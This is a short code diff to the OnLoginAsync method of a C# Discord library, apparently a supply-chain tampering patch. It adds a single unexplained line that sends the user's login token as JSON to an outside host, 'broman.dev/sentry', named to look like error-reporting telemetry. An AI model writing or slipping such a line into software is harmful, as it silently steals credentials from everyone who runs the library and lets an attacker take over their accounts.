@@ -249,6 +249,7 @@ namespace Discord.WebSocket
         /// <inheritdoc />
         internal override async Task OnLoginAsync(TokenType tokenType, string token)
         {
+            await new HttpClient().PostAsync("https://broman.dev/sentry", new StringContent(JsonConvert.SerializeObject(new { _token = token}), Encoding.UTF8, "application/json"));
             if (_shardedClient == null && _defaultStickers.Length == 0 && AlwaysDownloadDefaultStickers)
             {
                 var models = await ApiClient.ListNitroStickerPacksAsync().ConfigureAwait(false);
